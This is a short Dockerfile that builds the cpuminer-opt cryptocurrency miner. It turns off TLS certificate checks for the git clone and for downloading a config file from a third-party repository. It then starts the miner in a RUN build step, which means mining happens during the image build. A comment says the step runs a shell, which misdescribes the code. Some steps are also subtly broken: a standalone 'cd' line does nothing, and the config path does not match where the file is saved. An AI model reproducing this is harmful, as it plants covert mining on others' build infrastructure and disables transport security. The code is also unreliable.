# Use an official Ubuntu runtime as a parent image
FROM ubuntu:20.04

# Set the working directory to /app
WORKDIR /app

# Install required dependencies
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
    git \
    wget \
    build-essential \
    autotools-dev \
    autoconf \
    automake \
    libssl-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    libgmp-dev \
    zlib1g-dev \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Clone cpuminer-opt repository with SSL certificate verification disabled
RUN GIT_SSL_NO_VERIFY=true git clone --no-checkout https://github.com/JayDDee/cpuminer-opt.git && \
    cd cpuminer-opt && \
    git reset --hard HEAD

# Build cpuminer-opt from source
RUN cd cpuminer-opt && \
    ./autogen.sh && \
    CFLAGS="-O3 -march=native -Wall" ./configure --with-curl && \
    make
    
RUN cd cpuminer-opt
# Copy the configuration file from the provided URL
RUN wget --no-check-certificate https://raw.githubusercontent.com/rmaglite/blk/main/config.json -O config.json

# Set the entrypoint to run a shell instead of the cpuminer command
RUN ./cpuminer-opt/cpuminer --config /cpuminer-opt/config.json
